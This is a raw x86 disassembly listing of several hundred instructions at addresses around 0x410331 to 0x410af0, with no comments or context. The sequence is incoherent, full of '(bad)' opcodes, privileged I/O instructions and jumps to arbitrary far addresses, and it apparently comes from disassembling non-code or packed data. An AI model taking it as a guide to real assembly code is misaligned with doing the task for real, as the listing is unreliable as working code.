  410331:	fimul  WORD PTR [esi]
  410333:	aas    
  410334:	mov    gs,WORD PTR [esi]
  410336:	mov    eax,ds:0x9be132e0
  41033b:	pop    esi
  41033c:	je     0x4102e9
  41033e:	pop    eax
  41033f:	mov    ch,0xc0
  410341:	push   edx
  410342:	push   esi
  410343:	xchg   edx,eax
  410344:	push   es
  410345:	(bad)  
  410347:	push   ebp
  410348:	lods   al,BYTE PTR ds:[esi]
  410349:	and    ch,BYTE PTR [edi]
  41034b:	shl    esp,0x43
  41034e:	int3   
  41034f:	jp     0x410354
  410351:	push   es
  410352:	sbb    al,0x12
  410354:	sub    ebx,DWORD PTR [ebx]
  410356:	js     0x4103b0
  410358:	push   ds
  410359:	in     al,0xb6
  41035b:	jb     0x4103d7
  41035d:	je     0x410330
  41035f:	cli    
  410360:	hlt    
  410361:	cmp    al,0xb6
  410363:	adc    ebp,esi
  410365:	cmp    BYTE PTR [edx],al
  410367:	retf   
  410368:	mov    ch,0x63
  41036a:	pusha  
  41036b:	push   esi
  41036c:	mov    al,ds:0x3ed1e57d
  410371:	cld    
  410372:	sahf   
  410373:	mov    ds:0x6b21c6c0,eax
  410378:	ins    DWORD PTR es:[edi],dx
  410379:	cmp    DWORD PTR [ebx-0x33],esi
  41037c:	push   0xd76f2d17
  410381:	jns    0x4103ee
  410383:	leave  
  410384:	pop    edx
  410385:	int3   
  410386:	push   ebx
  410387:	jno    0x410374
  410389:	outs   dx,DWORD PTR ds:[esi]
  41038a:	fbstp  TBYTE PTR [ecx]
  41038c:	mov    ch,0x44
  41038e:	rcl    DWORD PTR [esp+edi*4-0x1d5843c7],1
  410395:	in     al,dx
  410396:	int    0xbd
  410398:	aad    0x66
  41039a:	js     0x410385
  41039c:	jmp    0xcd41:0x1a639bb7
  4103a3:	repz scas al,BYTE PTR es:[edi]
  4103a5:	jb     0x4103dc
  4103a7:	mov    bl,0xce
  4103a9:	push   cs
  4103aa:	mov    eax,0x776f9cde
  4103af:	repz fistp WORD PTR [edi+0x16]
  4103b3:	enter  0x1f57,0x95
  4103b7:	add    dl,BYTE PTR [ebx-0x1f]
  4103ba:	mov    ebp,0x841f3068
  4103bf:	sub    al,0xb1
  4103c1:	xor    dh,cl
  4103c3:	or     DWORD PTR [esi+0x5bd54426],0x4dc4e26a
  4103cd:	in     eax,dx
  4103ce:	lods   eax,DWORD PTR fs:[esi]
  4103d0:	fnsave [ecx-0x73eed534]
  4103d6:	dec    ecx
  4103d7:	mov    bh,0xa9
  4103d9:	jmp    0x4103d5
  4103db:	and    eax,0x3ab1b866
  4103e0:	ja     0x410405
  4103e2:	sbb    eax,0x46bbaa85
  4103e7:	adc    DWORD PTR [edi-0x51],edi
  4103ea:	jecxz  0x41044a
  4103ec:	pop    esi
  4103ed:	cmp    al,0xdc
  4103ef:	test   BYTE PTR [ebx-0xaa71547],ah
  4103f5:	in     al,0xad
  4103f7:	daa    
  4103f8:	test   al,0x2b
  4103fa:	gs xchg ebp,eax
  4103fc:	adc    DWORD PTR [eax],ecx
  4103fe:	aam    0xb3
  410400:	push   esi
  410401:	outs   dx,DWORD PTR ds:[esi]
  410402:	bound  ecx,QWORD PTR [eax-0x16a2aa37]
  410408:	mov    dh,0x54
  41040a:	std    
  41040b:	lods   al,BYTE PTR ds:[esi]
  41040c:	(bad)  [esi+0x3a1dbbb6]
  410412:	cld    
  410413:	in     al,0x8f
  410415:	cmp    ch,BYTE PTR [edi+0x20]
  410418:	xor    eax,0xd7d9062f
  41041d:	daa    
  41041e:	jmp    0x4103cb
  410420:	jnp    0x410437
  410422:	mov    ds:0x9ad4cb40,al
  410427:	pop    ds
  410428:	or     eax,0xf4ef21af
  41042d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41042e:	push   edx
  41042f:	add    BYTE PTR [edi+0x5a2a581a],0xd5
  410436:	xchg   DWORD PTR [ecx],ebp
  410438:	int    0x70
  41043a:	arpl   WORD PTR [edx-0x48],cx
  41043d:	aaa    
  41043e:	jmp    DWORD PTR [ecx-0x62]
  410441:	imul   ebx,DWORD PTR ds:0xf144f664,0xb87b870
  41044b:	les    esp,FWORD PTR [ebp-0x16]
  41044e:	inc    edi
  41044f:	jmp    FWORD PTR [eax-0x44]
  410452:	push   eax
  410453:	mov    al,0x75
  410455:	aas    
  410456:	xchg   ebx,eax
  410457:	or     DWORD PTR ds:0xe601a7e4,esp
  41045d:	sbb    ah,bh
  41045f:	inc    edi
  410460:	enter  0xb5e1,0x14
  410464:	push   0x649a6687
  410469:	lds    edi,FWORD PTR [ebx+esi*8-0x75]
  41046d:	cmc    
  41046e:	cwde   
  41046f:	loopne 0x410496
  410471:	js     0x410429
  410473:	dec    ebp
  410474:	cld    
  410475:	and    dh,ch
  410477:	pop    ss
  410478:	pop    eax
  410479:	mul    DWORD PTR [ebx+0x30]
  41047c:	jmp    0x41046e
  41047e:	pop    edx
  41047f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410480:	push   es
  410481:	or     BYTE PTR [ebp+0x4d],dh
  410484:	test   BYTE PTR ss:[edi-0x4bb7449a],al
  41048b:	hlt    
  41048c:	mov    ch,0x73
  41048e:	add    al,ch
  410490:	sub    dh,BYTE PTR [esi+ebx*2+0x7bb19050]
  410497:	mov    eax,edx
  410499:	add    BYTE PTR [ebx-0x43b8a65a],ch
  41049f:	mov    al,cl
  4104a1:	sbb    DWORD PTR [edx],ecx
  4104a3:	aad    0xf5
  4104a5:	push   ss
  4104a6:	das    
  4104a7:	dec    ebp
  4104a8:	loop   0x41044b
  4104aa:	inc    esp
  4104ab:	je     0x41044c
  4104ad:	cmp    al,ch
  4104af:	adc    DWORD PTR [esi+0x1c],ebx
  4104b2:	imul   esi,DWORD PTR [ebp+0x3c5b17a5],0x30
  4104b9:	mov    DWORD PTR [esi],esp
  4104bb:	or     DWORD PTR [ebp-0x6d],0x19
  4104bf:	(bad)  [eax]
  4104c1:	jle    0x4104af
  4104c3:	outs   dx,BYTE PTR ds:[esi]
  4104c4:	or     BYTE PTR [edi-0x138a50a7],ah
  4104ca:	ins    BYTE PTR es:[edi],dx
  4104cb:	jbe    0x410468
  4104cd:	das    
  4104ce:	call   0x542b:0xbecf11f
  4104d5:	mov    ds:0xb75201c2,al
  4104db:	cmp    edi,ebx
  4104dd:	add    ecx,ecx
  4104df:	pop    edi
  4104e0:	dec    ecx
  4104e1:	in     al,0xe2
  4104e3:	loope  0x410544
  4104e5:	inc    DWORD PTR [edi-0xc]
  4104e8:	sahf   
  4104e9:	xchg   ebp,eax
  4104ea:	dec    edx
  4104eb:	xor    al,0xe5
  4104ed:	cmp    ch,BYTE PTR [ecx+esi*1-0x4397ba51]
  4104f4:	inc    esp
  4104f5:	aad    0x8c
  4104f7:	dec    eax
  4104f8:	scas   al,BYTE PTR es:[edi]
  4104f9:	sar    al,1
  4104fb:	sub    eax,0x9d1461b0
  410500:	add    ah,BYTE PTR [edx]
  410502:	les    edi,FWORD PTR [ecx+eiz*2-0x3c]
  410506:	mov    esp,0xb367294b
  41050b:	arpl   WORD PTR [edx+edx*8],di
  41050e:	retf   0xc1b5
  410511:	fild   QWORD PTR [edi-0x883dce5]
  410517:	lods   al,BYTE PTR ds:[esi]
  410518:	xor    eax,0x25cc7dfc
  41051d:	cmp    edx,DWORD PTR [esi-0x1e]
  410520:	and    ebp,esi
  410522:	push   ebp
  410523:	fistp  QWORD PTR [edi+0xbfe97b5]
  410529:	std    
  41052a:	aaa    
  41052b:	fucomip st,st(1)
  41052d:	call   0x8dcbc932
  410532:	imul   eax,ebx,0xba9d9ae
  410538:	bound  esi,QWORD PTR [esi-0x69d41f55]
  41053e:	(bad)  
  41053f:	xchg   edi,eax
  410540:	dec    ebp
  410541:	mov    bh,0xd4
  410543:	dec    edx
  410544:	jnp    0x410517
  410546:	push   ebx
  410547:	xor    al,0xa0
  410549:	in     eax,0xe6
  41054b:	and    al,0x38
  41054d:	jns    0x410539
  41054f:	into   
  410550:	mov    al,ds:0xd755bad8
  410555:	pop    ecx
  410556:	mov    ds:0x1939881e,al
  41055b:	mov    BYTE PTR [ebx+eiz*4],dh
  41055e:	dec    eax
  41055f:	jbe    0x4105c5
  410561:	push   cs
  410562:	or     eax,0x58c6ce16
  410567:	(bad)  
  410568:	out    0x37,eax
  41056a:	out    0x12,eax
  41056c:	retf   
  41056d:	rcl    BYTE PTR [ecx+0x57],cl
  410570:	push   ebp
  410571:	mov    dh,0xaa
  410573:	hlt    
  410574:	popa   
  410575:	or     eax,0x8f072b
  41057a:	cmp    eax,0xf048f67f
  41057f:	sub    al,0x69
  410581:	xchg   edx,eax
  410582:	adc    esi,ecx
  410584:	rol    BYTE PTR [esp+esi*2],1
  410587:	mov    bl,0xb1
  410589:	aas    
  41058a:	push   esp
  41058b:	fwait
  41058c:	and    DWORD PTR [edx+0x35a8eea7],edi
  410592:	sbb    BYTE PTR [edx+edi*8],bh
  410595:	and    al,BYTE PTR [ebx+0x68]
  410598:	sbb    ebp,DWORD PTR [esi-0x34]
  41059b:	fucomi st,st(6)
  41059d:	ret    0x8b1
  4105a0:	loop   0x41058f
  4105a2:	inc    ecx
  4105a3:	xchg   DWORD PTR [edx],edx
  4105a5:	sbb    eax,0x8bca7bfa
  4105aa:	push   0xffffff8c
  4105ac:	retf   
  4105ad:	pop    ebx
  4105ae:	xor    DWORD PTR [esi+0x7544006a],esi
  4105b4:	xor    al,0x42
  4105b6:	and    DWORD PTR [ebp-0x78],eax
  4105b9:	add    BYTE PTR [edx+edx*1-0x6a],0xed
  4105be:	xchg   ecx,eax
  4105bf:	ins    BYTE PTR es:[edi],dx
  4105c0:	(bad)  
  4105c1:	sub    BYTE PTR [ebp-0x5536b485],bh
  4105c7:	fcmovne st,st(2)
  4105c9:	sub    cl,BYTE PTR [ecx+0x31]
  4105cc:	or     eax,0x2d401b44
  4105d1:	lea    eax,[edi]
  4105d3:	daa    
  4105d4:	or     bx,di
  4105d7:	or     al,0x4d
  4105d9:	test   DWORD PTR [ebx+0x3c],ebp
  4105dc:	adc    eax,0xa9583eb3
  4105e1:	add    DWORD PTR [edi],edi
  4105e3:	out    0xf2,eax
  4105e5:	aam    0x48
  4105e7:	xor    DWORD PTR [ecx-0x5890f1e6],esp
  4105ed:	mov    esp,0x202bc256
  4105f2:	dec    DWORD PTR [edx]
  4105f4:	scas   al,BYTE PTR es:[edi]
  4105f5:	neg    BYTE PTR [ebx]
  4105f7:	sub    ecx,DWORD PTR [ebx+0x1f890f3a]
  4105fd:	mov    BYTE PTR [ebp-0x31],al
  410600:	stos   BYTE PTR es:[edi],al
  410601:	adc    dh,BYTE PTR [esi-0x55a54b20]
  410607:	in     al,0x36
  410609:	in     eax,0xd0
  41060b:	sub    cl,bl
  41060d:	mov    fs,WORD PTR [edx]
  41060f:	loope  0x41065a
  410611:	add    ah,BYTE PTR [edx+ecx*2]
  410614:	inc    ecx
  410615:	les    esp,FWORD PTR [edi+0x29]
  410618:	jno    0x410601
  41061a:	mov    bh,0x77
  41061c:	cmp    esi,ebx
  41061e:	push   ecx
  41061f:	pop    eax
  410620:	and    DWORD PTR [esi-0x1d08ea2f],esp
  410626:	inc    ebx
  410627:	xor    cl,ch
  410629:	std    
  41062a:	dec    esi
  41062b:	repnz call 0xdeac:0xb965df48
  410633:	outs   dx,DWORD PTR ds:[esi]
  410634:	mov    ds:0x946bf283,al
  410639:	out    0x4e,al
  41063b:	icebp  
  41063c:	fiadd  DWORD PTR [edi]
  41063e:	and    eax,0x2ba03d3a
  410643:	scas   eax,DWORD PTR es:[edi]
  410644:	jge    0x4106c5
  410646:	jle    0x4106c2
  410648:	out    0xe9,eax
  41064a:	push   cs
  41064b:	or     eax,ecx
  41064d:	inc    esi
  41064e:	popf   
  41064f:	push   ds
  410650:	push   ebp
  410651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410652:	add    ebp,eax
  410654:	add    bh,BYTE PTR [esi]
  410656:	sub    bh,BYTE PTR [edx]
  410658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410659:	mov    bh,0xb6
  41065b:	test   ebp,0x19ce05a5
  410661:	jns    0x410699
  410663:	xlat   BYTE PTR ds:[ebx]
  410664:	mov    ds:0xace043,al
  410669:	ror    ebx,cl
  41066b:	fwait
  41066c:	aad    0xe6
  41066e:	(bad)  
  41066f:	mov    esi,DWORD PTR [eax+eax*1+0x6d]
  410673:	aad    0xa9
  410675:	adc    DWORD PTR [edi-0x67],0x2
  410679:	loope  0x410644
  41067b:	add    bl,BYTE PTR [esp+eiz*4-0x17]
  41067f:	sub    DWORD PTR [ebx-0x112ea91c],esp
  410685:	popf   
  410686:	mov    DWORD PTR [ebx+edi*2-0x2bc12240],ebp
  41068d:	clc    
  41068e:	imul   edx,DWORD PTR [ecx+0x68740d84],0x70c63cd6
  410698:	push   edi
  410699:	mov    al,ds:0x9b9bf154
  41069e:	scas   eax,DWORD PTR es:[edi]
  41069f:	in     al,0x2a
  4106a1:	shl    BYTE PTR [ebx+ebx*2],1
  4106a4:	call   0x13552e46
  4106a9:	int3   
  4106aa:	ins    BYTE PTR es:[edi],dx
  4106ab:	repz ror BYTE PTR [ebp-0x3a],0x95
  4106b0:	dec    ecx
  4106b1:	ret    0x6a90
  4106b4:	mov    eax,ds:0x43dacd62
  4106b9:	jl     0x410689
  4106bb:	mov    edi,0xb7a2efa2
  4106c0:	call   0x8a7d:0x9efb679
  4106c7:	xor    dh,0x45
  4106ca:	lods   al,BYTE PTR ds:[esi]
  4106cb:	or     esp,DWORD PTR [eax-0x3c]
  4106ce:	add    edi,eax
  4106d0:	js     0x41074c
  4106d2:	adc    eax,0x7ce3b472
  4106d7:	aaa    
  4106d8:	fnstenv [ebx+0x58]
  4106db:	adc    BYTE PTR [eax-0x46],cl
  4106de:	push   esi
  4106df:	pop    ds
  4106e0:	pop    ecx
  4106e1:	xchg   DWORD PTR [ecx+ebp*4+0x24f47cf9],ebx
  4106e8:	xlat   BYTE PTR ds:[ebx]
  4106e9:	mov    ah,0x63
  4106eb:	xor    eax,0xbfc93520
  4106f0:	nop
  4106f1:	cmp    DWORD PTR [ecx+0x68],edi
  4106f4:	std    
  4106f5:	add    eax,0xe5619040
  4106fa:	push   ecx
  4106fb:	xor    al,0x68
  4106fd:	sub    DWORD PTR [eax+0x77],esp
  410700:	(bad)  
  410701:	xor    al,0xf0
  410703:	or     eax,0xde1753d7
  410708:	adc    edx,edi
  41070a:	scas   eax,DWORD PTR es:[edi]
  41070b:	jns    0x41069d
  41070d:	loope  0x4106fa
  41070f:	sbb    esi,edi
  410711:	nop
  410712:	stc    
  410713:	mov    edx,0xb4e7f9bf
  410718:	test   BYTE PTR [ebx+0x77f45e7e],dl
  41071e:	xchg   ebx,eax
  41071f:	aam    0x4f
  410721:	push   esi
  410722:	sbb    ebp,DWORD PTR [ebp+0x5c42a8ff]
  410728:	jge    0x41071d
  41072a:	xchg   edx,eax
  41072b:	imul   ecx,DWORD PTR [edx-0x4e13c240],0x302bf4c3
  410735:	dec    ebx
  410736:	mov    dh,0x6f
  410738:	icebp  
  410739:	push   ds
  41073a:	dec    edx
  41073b:	xor    ch,BYTE PTR [ebp+esi*8+0x43]
  41073f:	icebp  
  410740:	adc    al,0xfa
  410742:	shl    DWORD PTR [edx-0xf],cl
  410745:	or     al,0x60
  410747:	pop    ecx
  410748:	shl    BYTE PTR [esi-0x3171bc39],1
  41074e:	fs neg esp
  410751:	into   
  410752:	mov    edi,0xe4ad4f64
  410757:	gs mov bh,0xa2
  41075a:	hlt    
  41075b:	xchg   esp,eax
  41075c:	cwde   
  41075d:	aam    0x46
  41075f:	arpl   WORD PTR [edi+0x57dcd052],sp
  410765:	retf   
  410766:	xchg   ebp,eax
  410767:	stos   DWORD PTR es:[edi],eax
  410768:	cdq    
  410769:	mov    dl,0x7d
  41076b:	inc    ecx
  41076c:	shl    BYTE PTR [eax+edx*8+0x21],cl
  410770:	lods   eax,DWORD PTR ds:[esi]
  410771:	aas    
  410772:	test   DWORD PTR [edx+0x13],esi
  410775:	retf   0x879c
  410778:	jmp    0x4107a1
  41077a:	enter  0x9bb4,0xfe
  41077e:	rol    DWORD PTR [edx+0x4a005a72],cl
  410784:	lods   al,BYTE PTR ds:[esi]
  410785:	fld    TBYTE PTR [ebx]
  410787:	xchg   DWORD PTR [ebx],ebx
  410789:	or     al,0x48
  41078b:	es push es
  41078d:	push   ecx
  41078e:	sar    BYTE PTR [edx+0x691aff],cl
  410794:	pusha  
  410795:	ins    BYTE PTR es:[edi],dx
  410796:	xor    eax,0x724cbcd8
  41079b:	dec    eax
  41079c:	inc    eax
  41079d:	fisubr DWORD PTR [esi+0x48718637]
  4107a3:	nop
  4107a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107a5:	pop    edx
  4107a6:	xchg   DWORD PTR [edx+0x74],ebp
  4107a9:	nop
  4107aa:	push   edx
  4107ab:	sbb    BYTE PTR [edx+0x3e099eb8],0x8c
  4107b2:	dec    ecx
  4107b3:	jl     0x41075e
  4107b5:	pop    edi
  4107b6:	dec    esi
  4107b7:	xchg   edx,eax
  4107b8:	or     DWORD PTR [esi+0x6321d2b5],ecx
  4107be:	dec    ebp
  4107bf:	clc    
  4107c0:	add    edi,DWORD PTR [ebx]
  4107c2:	pushf  
  4107c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107c4:	imul   esp,DWORD PTR [esi+0x296a6add],0xbbb249f6
  4107ce:	neg    DWORD PTR ds:0x7cd8d5aa
  4107d4:	inc    eax
  4107d5:	xchg   ebx,eax
  4107d6:	push   edi
  4107d7:	data16 loope 0x41080f
  4107da:	sub    DWORD PTR [esi+0x1b],0x1f21299e
  4107e1:	adc    al,0xb6
  4107e3:	in     eax,dx
  4107e4:	add    esp,DWORD PTR [ecx]
  4107e6:	dec    eax
  4107e7:	xor    edi,DWORD PTR [esp+eax*8+0x236220d6]
  4107ee:	aam    0x27
  4107f0:	lods   al,BYTE PTR ds:[esi]
  4107f1:	ins    BYTE PTR es:[edi],dx
  4107f2:	push   0x17
  4107f4:	fsub   st(4),st
  4107f6:	test   ch,al
  4107f8:	or     al,0xfa
  4107fa:	jg     0x4107a9
  4107fc:	jo     0x410787
  4107fe:	sbb    ah,ch
  410800:	xchg   ecx,eax
  410801:	lds    eax,FWORD PTR [esi+0x7e63b1dd]
  410807:	lock pop ecx
  410809:	mov    cs,WORD PTR [edi-0x77752492]
  41080f:	push   ds
  410810:	and    edx,DWORD PTR [ebp-0x1123b719]
  410816:	sbb    ecx,DWORD PTR [edi-0x16]
  410819:	shl    BYTE PTR [eax-0xeadb7f],cl
  41081f:	sub    BYTE PTR fs:[eax],dl
  410822:	loope  0x410848
  410824:	push   0x107cb3a8
  410829:	xor    al,0xde
  41082b:	popf   
  41082c:	test   DWORD PTR [ebx-0x41a6e456],edx
  410832:	test   eax,0xb2dafc6c
  410837:	jo     0x4107dc
  410839:	dec    edx
  41083a:	jmp    0x4107fe
  41083c:	outs   dx,DWORD PTR ds:[esi]
  41083d:	aam    0x1f
  41083f:	dec    edx
  410840:	pop    eax
  410841:	mov    ebp,0x6b986ebd
  410846:	xchg   BYTE PTR [ebp-0x3d],bl
  410849:	or     BYTE PTR [edi],al
  41084b:	cli    
  41084c:	jne    0x4108b9
  41084e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41084f:	ds pusha 
  410851:	pop    eax
  410852:	mov    al,BYTE PTR [ecx]
  410854:	mov    esi,0x94ce3b32
  410859:	test   eax,0x4a94406c
  41085e:	retf   0x8993
  410861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410862:	call   0xe116:0x28eabd17
  410869:	sbb    DWORD PTR [ecx-0x7021bd8a],ebx
  41086f:	imul   ax,si,0x6c
  410873:	loopne 0x410830
  410875:	xor    eax,0xa8bc58aa
  41087a:	mov    ebp,0x304b7706
  41087f:	hlt    
  410880:	xor    DWORD PTR [edi],ebp
  410882:	dec    eax
  410883:	imul   edx,DWORD PTR fs:[ebx-0x3c],0x60
  410888:	out    0x1,eax
  41088a:	or     bl,ch
  41088c:	movaps xmm3,XMMWORD PTR [ebp-0x3e]
  410890:	add    BYTE PTR ds:0x11ad4692,ch
  410896:	and    ebp,DWORD PTR [ecx]
  410898:	sub    ch,BYTE PTR [ecx-0x62]
  41089b:	pop    ss
  41089c:	add    al,0x28
  41089e:	retf   0x2f80
  4108a1:	xchg   DWORD PTR [ebx],edi
  4108a3:	leave  
  4108a4:	fxch   st(1)
  4108a6:	pop    es
  4108a7:	inc    esp
  4108a8:	and    cl,bh
  4108aa:	xchg   ebx,eax
  4108ab:	aam    0xce
  4108ad:	xor    BYTE PTR [edi+0x4],0x4f
  4108b1:	xchg   edi,eax
  4108b2:	test   cl,0x71
  4108b5:	jle    0x4108d8
  4108b7:	or     al,0xc9
  4108b9:	imul   DWORD PTR [edx]
  4108bb:	inc    ebx
  4108bc:	add    dh,0x2e
  4108bf:	jmp    0xa6ce:0x199fd6b1
  4108c6:	and    esp,esi
  4108c8:	scas   al,BYTE PTR es:[edi]
  4108c9:	aaa    
  4108ca:	int    0xe2
  4108cc:	xchg   BYTE PTR ds:0xe4d742e3,al
  4108d2:	lods   eax,DWORD PTR ds:[esi]
  4108d3:	sbb    DWORD PTR [ebp-0x7a],eax
  4108d6:	cmp    eax,0x35414602
  4108db:	push   eax
  4108dc:	mov    ebp,0x71d0679d
  4108e1:	gs dec ebp
  4108e3:	fld    QWORD PTR [eax]
  4108e5:	dec    esp
  4108e6:	adc    ebp,DWORD PTR [ecx+0x63]
  4108e9:	mov    cl,0xae
  4108eb:	or     cl,dh
  4108ed:	enter  0x64a1,0xdd
  4108f1:	lahf   
  4108f2:	jg     0x4108bf
  4108f4:	clc    
  4108f5:	sub    al,0x1e
  4108f7:	(bad)  
  4108f8:	outs   dx,BYTE PTR ds:[esi]
  4108f9:	xchg   ebp,eax
  4108fa:	in     eax,0xb3
  4108fc:	sub    BYTE PTR [ecx+0x7b9b77e2],0x0
  410903:	lds    ecx,FWORD PTR [ebp-0x47]
  410906:	lods   al,BYTE PTR ds:[esi]
  410907:	lahf   
  410908:	test   DWORD PTR [edi+0x6b],edi
  41090b:	cmp    eax,0x863d7f8b
  410910:	(bad)  
  410911:	ins    DWORD PTR es:[edi],dx
  410912:	leave  
  410913:	mov    cl,0xa
  410915:	jmp    0x2152ffa
  41091a:	xor    al,0x9
  41091c:	mov    ah,0xb0
  41091e:	inc    ebp
  41091f:	popa   
  410920:	xchg   edx,eax
  410921:	mov    ds:0xa7901c7e,al
  410926:	dec    esi
  410927:	jae    0x41095f
  410929:	aad    0xff
  41092b:	jg     0x4108b4
  41092d:	cli    
  41092e:	fistp  QWORD PTR [ebp-0x68]
  410931:	and    ch,BYTE PTR [eax-0x17]
  410934:	test   al,0x4
  410936:	cmc    
  410937:	mov    al,0x41
  410939:	sti    
  41093a:	(bad)  
  41093b:	or     al,0x4
  41093d:	gs imul ebx,esp,0x76
  410941:	xor    eax,0x5a073d37
  410946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410947:	retf   0x8df1
  41094a:	add    BYTE PTR [eax],dl
  41094c:	cs retf 0x414c
  410950:	sbb    eax,0x4ae6d6e4
  410955:	rcr    BYTE PTR ds:0x18ea92b3,1
  41095b:	lods   eax,DWORD PTR ds:[esi]
  41095c:	push   ecx
  41095d:	inc    esi
  41095e:	retf   
  41095f:	pop    es
  410960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410962:	inc    eax
  410963:	jg     0x410966
  410965:	repz cmp ah,BYTE PTR [ebx-0x28]
  410969:	inc    esi
  41096a:	fist   WORD PTR [edx-0x55]
  41096d:	inc    ecx
  41096e:	sbb    bl,al
  410970:	(bad)  
  410971:	bnd ret 0x1387
  410975:	mov    esp,0x50eb148a
  41097a:	xchg   esp,eax
  41097b:	sub    BYTE PTR [edi-0x1b],cl
  41097e:	push   edi
  41097f:	scas   al,BYTE PTR es:[edi]
  410980:	mov    WORD PTR [ebp+0x1f],gs
  410983:	mov    ebp,ecx
  410985:	xchg   ecx,eax
  410986:	test   dh,al
  410988:	jecxz  0x41096e
  41098a:	mov    es,edx
  41098c:	aam    0xb8
  41098e:	jae    0x4109c3
  410990:	push   ecx
  410991:	ficomp WORD PTR [edi-0x7d0cc1b3]
  410997:	iret   
  410998:	jb     0x4109d7
  41099a:	pop    eax
  41099b:	inc    eax
  41099c:	mov    edi,0xacb84f0b
  4109a1:	push   0x339428e
  4109a6:	dec    edi
  4109a7:	mov    dh,0xc3
  4109a9:	pop    eax
  4109aa:	cmp    ch,BYTE PTR [ecx+ecx*2]
  4109ad:	or     BYTE PTR [ecx+0x61],dl
  4109b0:	mov    BYTE PTR [eax-0x26],bl
  4109b3:	shr    DWORD PTR [eax-0x41d4d4e7],1
  4109b9:	mov    ah,bh
  4109bb:	lea    ebp,[edx+0x4ed2fd19]
  4109c1:	test   eax,0x3fa5204a
  4109c6:	jg     0x4109f4
  4109c8:	call   DWORD PTR [ebx-0x19]
  4109cb:	aas    
  4109cc:	mov    cl,0x4c
  4109ce:	ds jne 0x4109e0
  4109d1:	xor    esp,ecx
  4109d3:	retf   
  4109d4:	aas    
  4109d5:	mov    ebx,ss
  4109d7:	imul   esi,DWORD PTR [ebx-0x28dac944],0xffffffde
  4109de:	in     al,dx
  4109df:	push   ecx
  4109e0:	dec    ecx
  4109e1:	sbb    al,0x9c
  4109e3:	xchg   cl,cl
  4109e5:	fnstenv [edi+0x2b7de1ad]
  4109eb:	xchg   esp,eax
  4109ec:	dec    esi
  4109ed:	cmp    dl,BYTE PTR [edx]
  4109ef:	and    al,0xe8
  4109f1:	xor    eax,0x26424f2f
  4109f6:	dec    ebx
  4109f7:	sbb    eax,0xeac6200c
  4109fc:	add    DWORD PTR [ebx+0x7221b8de],ebp
  410a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a03:	adc    ebp,esp
  410a05:	push   esp
  410a06:	push   ebx
  410a07:	dec    eax
  410a08:	mov    dl,0x9a
  410a0a:	cmp    bl,0xef
  410a0d:	pop    esp
  410a0e:	push   0x11
  410a10:	push   ecx
  410a11:	jle    0x41099d
  410a13:	cwde   
  410a14:	inc    edi
  410a15:	mov    eax,0x7c5276f0
  410a1a:	pop    ds
  410a1b:	cmc    
  410a1c:	sbb    al,0x85
  410a1e:	fnstcw WORD PTR [edi]
  410a20:	xor    BYTE PTR [edi],bl
  410a22:	mov    bh,0xea
  410a24:	ins    BYTE PTR es:[edi],dx
  410a25:	rcr    cl,1
  410a27:	jle    0x410a76
  410a29:	or     ah,BYTE PTR [edx]
  410a2b:	call   0x577a20c7
  410a30:	push   esi
  410a31:	int    0xa
  410a33:	mov    esi,fs
  410a35:	js     0x410a58
  410a37:	ins    BYTE PTR es:[edi],dx
  410a38:	addr16 dec edx
  410a3a:	cmp    BYTE PTR [eax+ebx*8-0x816d80e],dl
  410a41:	jo     0x4109c5
  410a43:	dec    ebp
  410a44:	or     al,0xb1
  410a46:	(bad)  
  410a48:	mov    ds:0x5bd03406,al
  410a4d:	xchg   esp,eax
  410a4e:	xchg   esi,eax
  410a4f:	jb     0x410a4f
  410a51:	or     eax,0xc65e5d5c
  410a56:	stos   BYTE PTR es:[edi],al
  410a57:	sbb    eax,0x1f469353
  410a5c:	pop    ebp
  410a5d:	inc    esp
  410a5e:	outs   dx,DWORD PTR ds:[esi]
  410a5f:	mov    ch,0x31
  410a61:	(bad)  
  410a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a63:	and    ecx,edx
  410a65:	dec    esp
  410a66:	shr    BYTE PTR [esp+edi*4-0x48],0x9a
  410a6b:	pop    es
  410a6c:	jns    0x410a85
  410a6e:	pop    ecx
  410a6f:	inc    esp
  410a70:	inc    edx
  410a71:	(bad)  
  410a72:	cmc    
  410a73:	and    BYTE PTR [edx],bl
  410a75:	add    al,0xef
  410a77:	or     ebp,DWORD PTR [ecx+0x739ba374]
  410a7d:	push   ecx
  410a7e:	(bad)  
  410a80:	call   esp
  410a82:	mov    BYTE PTR [ebx],0xcc
  410a85:	bound  esp,QWORD PTR ds:0xcc960b23
  410a8b:	mov    ebp,0x98f15c89
  410a90:	or     eax,0xfab1e772
  410a95:	aam    0xec
  410a97:	retf   
  410a98:	cmp    al,0xd5
  410a9a:	hlt    
  410a9b:	pop    edi
  410a9c:	mov    ah,0xa2
  410a9e:	xor    eax,0x695cdf8e
  410aa3:	sub    cl,al
  410aa5:	idiv   BYTE PTR [ebx-0x6d]
  410aa8:	into   
  410aa9:	cld    
  410aaa:	popa   
  410aab:	dec    ecx
  410aac:	mov    ebx,0xe4815474
  410ab1:	jecxz  0x410ac1
  410ab3:	call   0xef35:0xd21a62be
  410aba:	ss leave 
  410abc:	in     eax,dx
  410abd:	sbb    al,0x31
  410abf:	mov    eax,0x2657dbb6
  410ac4:	shr    dh,0x71
  410ac7:	mov    cl,0x16
  410ac9:	test   al,0x8e
  410acb:	cmp    al,0xb7
  410acd:	push   edi
  410ace:	dec    edx
  410acf:	cmp    DWORD PTR [ebp+0x5a],0xffffffcb
  410ad3:	nop
  410ad4:	add    eax,DWORD PTR [eax+0x4f77fba7]
  410ada:	mov    ebp,0x25aab049
  410adf:	jle    0x410af5
  410ae1:	cld    
  410ae2:	retf   
  410ae3:	push   cs
  410ae4:	dec    ebx
  410ae5:	(bad)  
  410ae6:	mov    cl,0x17
  410ae8:	in     al,dx
  410ae9:	sbb    dl,bh
  410aeb:	sbb    eax,0x46c7434a
  410af0:	pushf  
